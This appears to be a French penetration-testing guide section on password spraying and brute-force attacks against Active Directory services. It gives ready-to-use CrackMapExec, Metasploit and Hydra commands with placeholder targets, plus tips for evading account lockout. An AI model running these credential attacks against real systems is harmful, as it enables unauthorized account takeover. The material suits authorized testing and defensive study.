# III.B. Attaques par Force Brute et Password Spraying

Ces techniques visent à deviner les mots de passe des utilisateurs pour des services authentifiés.

## 1. Password Spraying (Pulvérisation de Mots de Passe)

*   **Principe :** Tester un ou quelques mots de passe courants/probables (ex: `Hiver2023!`, `Ete2024?`, `Password123`) contre une grande liste de noms d'utilisateurs. Moins susceptible de verrouiller les comptes que la force brute traditionnelle.
*   **Prérequis :**
    *   Liste de noms d'utilisateurs valides (obtenue via [OSINT](../01-reconnaissance-initiale/A-collecte-informations-publiques.md), [Kerbrute](../02-enumeration-domaine/A-utilisateurs-groupes-ordinateurs.md#1-enumeration-des-utilisateurs), LDAP anonyme, etc.).
    *   Connaissance de la politique de mot de passe (longueur, complexité, verrouillage - voir [Politiques et Configurations](../02-enumeration-domaine/C-politiques-configurations.md#1-enumeration-de-la-politique-de-mot-de-passe-du-domaine)).
*   **Outils et Commandes :**

    *   **CrackMapExec :**
        ```bash
        # Spraying sur SMB
        crackmapexec smb <IP_DC_OU_PLAGE> -u users.txt -p 'Hiver2023!' --continue-on-success
        # Spraying sur LDAP (attention, peut être plus sensible au verrouillage)
        crackmapexec ldap <IP_DC> -u users.txt -p 'Ete2024?' --continue-on-success
        # Spraying sur WinRM
        crackmapexec winrm <IP_CIBLE_OU_PLAGE> -u users.txt -p 'Password123'
        # Spraying sur SSH (si présent)
        crackmapexec ssh <IP_CIBLE_OU_PLAGE> -u users.txt -p 'Password123'
        ```
    *   **Metasploit (modules `auxiliary/scanner/...`) :**
        ```bash
        msfconsole
        msf > use auxiliary/scanner/smb/smb_login
        msf > set RHOSTS file:ips.txt
        msf > set USER_FILE users.txt
        msf > set PASS_FILE passwords_to_spray.txt # Fichier avec un ou quelques mots de passe
        msf > set STOP_ON_SUCCESS false # Important pour le spraying
        msf > set BRUTEFORCE_SPEED 5 # Ajuster pour éviter le verrouillage
        msf > run
        ```
    *   **Rubeus (pour Kerberos, si un compte valide est déjà connu pour tester d'autres) :**
        Peut être utilisé pour tester des mots de passe via `asktgt` mais plus adapté pour d'autres attaques Kerberos.

## 2. Force Brute Traditionnelle

*   **Principe :** Tester de nombreux mots de passe d'une liste (dictionnaire) contre un ou quelques noms d'utilisateurs. Plus bruyant et risque élevé de verrouillage de compte. À utiliser avec précaution.
*   **Cibles :** Comptes de service, comptes génériques, comptes d'administrateur connus.
*   **Outils :**
    *   **Hydra :**
        ```bash
        # Force brute RDP
        hydra -l <utilisateur> -P rockyou.txt rdp://<IP_CIBLE>
        # Force brute SMB
        hydra -l <utilisateur> -P passwords.txt <IP_CIBLE> smb
        # Force brute SSH
        hydra -t 4 -l <utilisateur> -P passwords.txt ssh://<IP_CIBLE>
        ```
    *   **CrackMapExec (avec un seul utilisateur et une liste de mots de passe) :**
        ```bash
        crackmapexec smb <IP_CIBLE> -u <utilisateur_cible> -p passwords.txt
        ```

## Considérations
*   Respecter la politique de verrouillage de compte.
*   Utiliser des délais entre les tentatives.
*   Privilégier le password spraying.
*   Documenter les tentatives et les identifiants trouvés. 